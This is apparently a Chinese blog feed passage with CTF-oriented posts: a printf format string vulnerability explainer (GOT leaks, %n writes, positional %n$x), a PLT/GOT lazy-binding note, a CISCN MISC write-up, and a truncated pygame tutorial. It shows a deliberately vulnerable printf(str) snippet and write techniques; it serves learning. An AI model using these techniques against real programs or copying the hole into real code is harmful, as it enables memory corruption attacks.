        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。会触发该漏洞的函数很有限。主要就是<code>printf</code>还有<code>sprintf</code>，<code>fprintf</code>等等c库中print家族的函数。因为主要是考查printf函数所以我就直接拿printf函数做讲解。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在前面介绍中提到过，printf函数会将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。printf函数会将第一个参数地址压入栈中读取时，会跳转到字符串的地址，之后再逐字节输出，如果遇到%就会根据%后面的字符进行判断并按指定规则输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d %c&quot;</span>,<span class="string">&quot;hello&quot;</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用gdb调试</p><p><img src="https://i.loli.net/2021/11/14/Zom9XOhRK6rwgjU.png" alt="屏幕截图 2021-11-14 123407.png"></p><p>因为是64位程序，所以调用printf前会将printf的参数压入指定指定寄存器。C语言默认调用协议是__cdecl，所以传参方式是从右到左。传参方面，如果参数是字符串，程序会将该字符串的地址作为参数传入到寄存器。</p><p><strong>程序是如何判断参数是在哪一个位置？</strong>其实很简单，程序会先找到字符串的位置并逐字节读取，在读取过程中会判断该字节是否是%，如果是就会根据下一字节来确定以何种方式输出后面的参数。</p><p><strong>所以说漏洞在哪里？</strong>当后面的参数不够时，也就是参数位大于参数时，printf就会输出最后一个参数后面地址里面的值输出出去，以此类推，这样就可以泄露地址了。</p><p><strong>所以我们应该如何利用呢？</strong>首先，我们可利用这个方式来泄露某个函数的got表。比如，我们如果将printf的参数修改成某个函数的got表地址，当printf输出时就可以把这个函数got表的内容输出出来从而造成地址泄露。其次，我们还可以利用printf修改某个参数的值。先补充一个知识点，**%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。**我们可以利用这一点来修改某个地址里面的值，首先我们可以将对应地址作为参数，在读取到这个参数之前先输出与我们想要修改值等数量的字符个数，最后用%n来修改这个值。这里可以参考我写的一篇文章<a href="https://eli0t-g.github.io/post/BUU-PWN">pwn5</a>。</p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="覆盖小数"><a href="#覆盖小数" class="headerlink" title="覆盖小数"></a>覆盖小数</h2><p>有些时候我们需要覆盖的值可能较小，只需要改动一个字节，而%n一次性会修改4或8字节，会导致覆盖了我们不想覆盖的值从而出现错误。为了解决这个问题，我们可以采用%hn或者%hhn修改两字节或者一字节。这样就可以避免不必要的覆盖。</p><h2 id="泄露指定的参数"><a href="#泄露指定的参数" class="headerlink" title="泄露指定的参数"></a>泄露指定的参数</h2><p>我们可以通过不断使用%x来泄露指定内存，但是如果程序限制了字节数那该怎么办。比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line">read(<span class="number">0</span>,str,<span class="number">10</span>);</span><br><span class="line"><span class="built_in">printf</span>(str);</span><br></pre></td></tr></table></figure><p>我们最多只能输出5个%x，如果要泄露的地址在后面怎么办？我们可以通过%n$x来泄露对应的参数（n代表对应参数的位置）</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>延迟绑定</title>
      <link href="/post/plt%E3%80%81got%E5%92%8C%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.html"/>
      <url>/post/plt%E3%80%81got%E5%92%8C%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.html</url>
      
        <content type="html"><![CDATA[<p>程序运行时，printf的地址就会被存储到data段，call   c &lt;hello+0xc&gt;就会跳转到call printf_stub</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf_stub:</span><br><span class="line">mov rax,[printf函数地址]</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>程序在编译的时候会采用两种表进行辅助，即plt表和got表。</p><ul><li>plt表为（Procedure Link Table），是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定</li><li>got表为（Global Offset Table），是Linux ELF文件中用于定位全局变量和函数的一个表。</li></ul><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>程序在执行前，如果对整个动态链接库函数进行符号解析的话，是非常浪费资源的，因为一个程序不可能调用动态链接库中所有的函数。我们最好能做到只对用到的函数进行函数解析，这样可以大大提高文件链接的效率，加快程序的启动速度。</p><p>为提高CPU的利用效率，动态链接器默认采用延迟链接方式，动态链接器不会在程序加载时解析每一个函数，而是在调用时通过plt和got来对函数进行解析，然后会将解析获得函数地址存放在got中，下一次调用时会直接使用got中的函数地址对函数进行调用。</p><h2 id="第一次调用"><a href="#第一次调用" class="headerlink" title="第一次调用"></a>第一次调用</h2><p>第一次调用某个函数时，会经历以下过程:</p><p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve -&gt; 函数地址</p><p>第一次调用时，由于延迟绑定，所以got表里面并没有函数的真正地址，此时got表存储的是函数的plt表下一命令地址。但是在plt跳转到got时还会将某个数压入栈中，这个数可以看出这个函数的ID，之后进入到公共@plt跳转执行_dl_runtime_resolve函数，这个函数的作用是根据函数ID来寻找对应函数，并改变got表地址为函数真正地址。</p><p><img src="https://i.loli.net/2021/10/17/eGA5HxQEUOrCDlf.png" alt="image.png"></p><h2 id="第二次调用"><a href="#第二次调用" class="headerlink" title="第二次调用"></a>第二次调用</h2><p>因为第一次调用已经将got表和函数进行绑定，所以调用某个函数时的流程就变成如下：</p><p>xxx@plt -&gt; xxx@got -&gt; 函数地址</p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>以下面代码为例进行调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hello();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令编译查看： </p><ul><li>gcc -Wall -g -o try.o -c try.c -m32                </li><li>objdump -d try.o</li></ul><p><img src="https://i.loli.net/2021/10/17/54RpjzwcThrgbkP.png" alt="屏幕截图 2021-10-17 143320.png"></p><p>程序运行时，printf的地址就会被存储到data段，call   c &lt;hello+0xc&gt;就会变成call printf_stub，printf_stub就会跳转到data段中printf地址，最后跳转到printf函数。printf_stub就相当于printf的plt表，data段中存储printf地址就相当于printf的got表。</p><p><img src="https://i.loli.net/2021/10/17/2UnLBCaiQbRkMtv.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 心得 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN复现</title>
      <link href="/post/CISCN%E5%A4%8D%E7%8E%B0.html"/>
      <url>/post/CISCN%E5%A4%8D%E7%8E%B0.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初次参加这种大型比赛，给我的感觉就是题目出的挺不错（一题都没做出来），但是这个比赛形式着实令人不解。不仅如此，在写完选择题后系统崩溃也是我没想得到（虽然没有停滞很久，但是感觉很意外，毕竟是国赛）。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><p>附件是一个txt文件，里面全是十六进制码，根据题目搜索发现是<a href="http://www.sendsms.cn/pdu/"><strong>PDU编码解码</strong></a>，解码发现前面四行得到有用的信息：flag前面一部分是15030442和w465。而后面则是一堆十六进制码，但是发现在第一行十六进制码的开头几个十六进制码正好是png十六进制文件头，猜测这些应该是png图片的十六进制码，利用脚本将其导出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开读取data.txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = data.splitlines()[<span class="number">4</span>:]  <span class="comment"># 前四条不是十六进制</span></span><br><span class="line"><span class="comment"># 启动谷歌</span></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&quot;http://www.sendsms.cn/pdu/&quot;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">output = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 用于接收结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    browser.find_element_by_name(<span class="string">&quot;smsText2&quot;</span>).clear()  <span class="comment"># 清空转换框里面的内容</span></span><br><span class="line">    browser.find_element_by_name(<span class="string">&quot;smsText2&quot;</span>).send_keys(i)  <span class="comment"># 输入要翻译的内容</span></span><br><span class="line">    browser.find_element_by_xpath(<span class="string">&quot;//input[@name=&#x27;checkButton&#x27;]&quot;</span>).click()  <span class="comment"># 点击翻译</span></span><br><span class="line">    recv = browser.find_element_by_name(<span class="string">&quot;smsOut&quot;</span>).get_attribute(<span class="string">&#x27;value&#x27;</span>)  <span class="comment"># 获取翻译内容</span></span><br><span class="line">    recv = recv.split()  <span class="comment"># 将获得内容按空格分开</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    txt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> recv:  <span class="comment"># 读取需要的信息</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">3</span>:  <span class="comment"># 获取时间戳</span></span><br><span class="line">            txt += j</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">13</span>:</span><br><span class="line">            txt += j  <span class="comment"># 获取十六进制码</span></span><br><span class="line">            txt += <span class="string">&#x27;\n&#x27;</span>  <span class="comment"># 分行</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    output += txt</span><br><span class="line">browser.quit()  <span class="comment"># 退出浏览器</span></span><br><span class="line">output = output.splitlines()</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">time = []</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:  <span class="comment"># 按时间戳进行排序</span></span><br><span class="line">    time.append(<span class="built_in">int</span>(i[<span class="number">3</span>:<span class="number">5</span>]) * <span class="number">60</span> + <span class="built_in">int</span>(i[<span class="number">6</span>:<span class="number">8</span>]) - <span class="number">1800</span>)</span><br><span class="line">    data.append(i[<span class="number">8</span>:])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i == time[j]:</span><br><span class="line">            result += data[j]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 将结果保存到out.txt文件中</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><p>之后导出图片，发现图片乱七八糟，想到之前w465应该是width465转成十六进制码就是1D1，得到图片</p><p><img src="https://i.loli.net/2021/05/18/du2PwMJRpSQLDyW.png" alt="未命名_1_.png"></p><p>结合前面得到flag：CISCN{15030442_b586_4c9e_b436_26def12293e4}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pygame使用</title>
      <link href="/post/pygame%E4%BD%BF%E7%94%A8.html"/>
      <url>/post/pygame%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>了解，学习一个第三方模块，最好是去官网学习，因为官方有第一手资料，而在其他人手里则是第二手，使用要学好还是得去<a href="https://www.pygame.org/wiki/GettingStarted">官网</a>。在这里我就直接拿实例讲pygame</p></blockquote><h1 id="安装pygame-windows"><a href="#安装pygame-windows" class="headerlink" title="安装pygame (windows)"></a>安装pygame (windows)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -U pygame --user</span><br></pre></td></tr></table></figure><p>可能的报错：</p><ul><li>输入python可能会报错，改成python3</li><li>无法下载，检查网络是否正常，确认无误还是无法下载，查看是否使用了梯子，如果使用就关闭。</li></ul><h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><p>设计一个游戏必须先有思路，这里我引用了一个大佬的图片，基本思路差不多，接下来就根据这个思路开始设计这个游戏</p><p><img src="https://i.loli.net/2021/05/12/jgWlDs5pc1rQUVN.png" alt="图片链接https://blog.csdn.net/weixin_45634606/article/details/105574019"></p><p>首先，在设计时要明确游戏有哪些元素，从而创建对应的类。在飞机大战中，要创建以下几个类：</p><ul><li><p>用于管理游戏资源和行为的类（我是将它放在alien_invasion.py文件中，作为游戏的入口）</p></li><li><p>存储游戏设置的类（settings.py）</p></li><li><p>存储飞机的类（ship.py）</p></li><li><p>存储子弹的类（bullet.py）</p></li><li><p>存储敌机的类（Alien.py）</p></li><li><p>存储游戏初始数据的类（game_stats.py）</p></li><li><p>存储得分的类（scoreboard.py）</p></li><li><p>存储初始游戏界面的类（bottom.py）</p><h1 id="alien-invasion-py"><a href="#alien-invasion-py" class="headerlink" title="alien_invasion.py"></a>alien_invasion.py</h1><p>首先要初始化要显示的窗口或屏幕</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlienInvasion</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span>                            </span><br><span class="line">        pygame.init()                                                                                   <span class="comment">#pygame.init()安全地初始化了所有导入的pygame模块</span></span><br><span class="line">        self.screen = pygame.display.set_mode((<span class="number">1200</span>,<span class="number">800</span>))         <span class="comment">#初始屏幕，1200是屏幕宽度，800是屏幕高度</span></span><br><span class="line">        pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)                      <span class="comment">#在屏幕边框上面添加游戏名Alien Invasion</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_game</span>(<span class="params">self</span>):</span>                                                                         <span class="comment">#游戏主循环，让游戏不断持续下去</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">                <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:                                          <span class="comment"># 如果用户输入q游戏就结束</span></span><br><span class="line">                    sys.exit()</span><br><span class="line">            pygame.display.flip()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    ai = AlienInvasion()</span><br><span class="line">    ai.run_game()</span><br></pre></td></tr></table></figure><p><strong>相关代码解释</strong>：</p><p>**if __ name __ == ‘ __ main <strong>： ‘**：</strong> name __ 是当前模块名，当模块被直接运行时模块名为 __ main __ 。这句话的意思就是，当模块被直接运行时，以下代码块将被运行，当模块是被导入时，代码块不被运行。（如果还是有疑惑查看<a href="https://www.sohu.com/a/426575177_671965">链接</a>）</p><p><strong>for event in pygame.event.get()：</strong>Pygame会接受用户的各种操作（比如按键盘，移动鼠标等）产生事件，事件随时可能发生，而且量也可能会很大，Pygame的做法是把一系列的事件存放一个队列里，逐个的处理。这行代码就是将事件逐一读取。</p><h1 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h1><p>存储游戏元素属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Settings</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen_width = <span class="number">1200</span>                 <span class="comment">#屏幕宽度</span></span><br><span class="line">        self.screen_height = <span class="number">600</span>                 <span class="comment">#屏幕高度</span></span><br><span class="line">        self.bg_color = (<span class="number">230</span>, <span class="number">230</span>, <span class="number">230</span>)      <span class="comment">#背景颜色</span></span><br><span class="line">        self.ship_speed = <span class="number">1.5</span>                      <span class="comment">#飞船移动速度</span></span><br><span class="line">        self.bullet_speed = <span class="number">1.5</span>               <span class="comment">#子弹速度</span></span><br><span class="line">        self.bullet_width = <span class="number">3</span>                  <span class="comment">#子弹宽度</span></span><br><span class="line">        self.bullet_height = <span class="number">15</span>                 <span class="comment">#子弹长度</span></span><br><span class="line">        self.bullet_color = (<span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span>)        <span class="comment">#子弹颜色</span></span><br><span class="line">        self.bullet_allowed = <span class="number">5</span>                <span class="comment">#子弹数量</span></span><br><span class="line">        self.alien_speed = <span class="number">1.0</span>                 <span class="comment">#外星人移动速度</span></span><br><span class="line">        self.fleet_drop_speed = <span class="number">10</span>           <span class="comment">#外星人设置</span></span><br><span class="line">        self.fleet_direction = <span class="number">1</span>               <span class="comment">#1是右移，-1是左移动</span></span><br><span class="line">        self.ship_limit = <span class="number">3</span>                           <span class="comment">#设置生命次数</span></span><br><span class="line">        self.speedup_scale = <span class="number">1.1</span>               <span class="comment">#游戏运行的速度</span></span><br><span class="line">        self.score_scale = <span class="number">1.5</span>                    <span class="comment">#根据游戏速度提高外星人的分数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize_dynamic_settings</span>(<span class="params">self</span>):</span>                              <span class="comment">#初始化在整个游戏中更改的设置</span></span><br><span class="line">        self.ship_speed = <span class="number">1.5</span>                                                         <span class="comment">#飞船移动速度</span></span><br><span class="line">        self.bullet_speed = <span class="number">3.0</span>                                                     <span class="comment">#子弹移动速度</span></span><br><span class="line">        self.alien_speed = <span class="number">1.0</span>                                                       <span class="comment">#外星人移动速度</span></span><br><span class="line">        self.fleet_direction = <span class="number">1</span>                                                       <span class="comment">#外星人移动方向</span></span><br><span class="line">        self.alien_points = <span class="number">50</span>                                                         <span class="comment">#每个外星人的分数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increase_speed</span>(<span class="params">self</span>):</span>                                                                       <span class="comment">#提高速度设置和外星人分数</span></span><br><span class="line">        self.ship_speed *= self.speedup_scale</span><br><span class="line">        self.bullet_speed *= self.speedup_scale</span><br><span class="line">        self.alien_speed *= self.speedup_scale</span><br><span class="line"></span><br><span class="line">        self.alien_points = <span class="built_in">int</span>(self.alien_points * self.score_scale)</span><br></pre></td></tr></table></figure><h1 id="ship-py"><a href="#ship-py" class="headerlink" title="ship.py"></a>ship.py</h1></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plane</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,ai_game</span>):</span></span><br><span class="line">        <span class="comment"># 初始化小飞机并设置其初始位置</span></span><br><span class="line">        self.screen = ai_game.screen                                                              <span class="comment">#加载图像，并获得其矩形区域</span></span><br><span class="line">        self.settings = ai_game.settings                                                         <span class="comment">#读取设置里面的信息</span></span><br><span class="line">        self.img_plane = pygame.image.load(<span class="string">&quot;images/ship.bmp&quot;</span>)          <span class="comment">#加载飞船照片</span></span><br><span class="line">        self.screen_rect = ai_game.screen.get_rect()                              <span class="comment">#得到飞船的的矩形区域</span></span><br><span class="line">        self.screen_rect = self.screen.get_rect()                                        <span class="comment">#得到screen的矩形区域</span></span><br><span class="line">        self.rect.midbottom = self.screen_rect.midbottom                      <span class="comment"># 将飞船放到底部中央</span></span><br><span class="line">        self.x = <span class="built_in">float</span>(self.rect.x)                                                                        <span class="comment">#存储飞机的位置</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blitme</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 在指定位置绘制小飞机</span></span><br><span class="line">        self.screen.blit(self.image, self.rect)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span>                                                                                                       <span class="comment">#根据运动标记更新飞船的位置</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:            <span class="comment">#如果飞船向右移动没有超过边界，飞船就向右移动x（x大小根据设置里面的飞船速度）</span></span><br><span class="line">            self.x += self.settings.ship_speed</span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:                                                        <span class="comment">#如果飞船向左移动没有超过边界，飞船就向左移动x </span></span><br><span class="line">            self.x -= self.settings.ship_speed </span><br><span class="line">            self.rect.x = self.x                                                                                             <span class="comment">#更新飞船位置</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">center_ship</span>(<span class="params">self</span>):</span>                                                                                 <span class="comment">#将飞船居中</span></span><br><span class="line">        self.rect.midbottom = self.screen_rect.midbottom                       <span class="comment">#定义飞船居中位置为屏幕下面底部中央</span></span><br><span class="line">        self.x = <span class="built_in">float</span>(self.rect.x)                                                                         <span class="comment">#更新飞船位置</span></span><br></pre></td></tr></table></figure><h1 id="bullet-py"><a href="#bullet-py" class="headerlink" title="bullet.py"></a>bullet.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bullet</span>(<span class="params">Sprite</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span>                                                                   <span class="comment">#在舰船的当前位置创建一个子弹对象</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()                                                                                   <span class="comment">#继承</span></span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        self.color = self.settings.bullet_color</span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, self.settings.bullet_width,self.settings.bullet_height)              <span class="comment">#创建一个子弹并放置在正确位置</span></span><br><span class="line">        self.rect.midtop = ai_game.ship.rect.midtop</span><br><span class="line">        self.y = <span class="built_in">float</span>(self.rect.y)                                                                          <span class="comment">#存储子弹的位置</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span>                                                                                            <span class="comment">#更新子弹位置</span></span><br><span class="line">        self.y 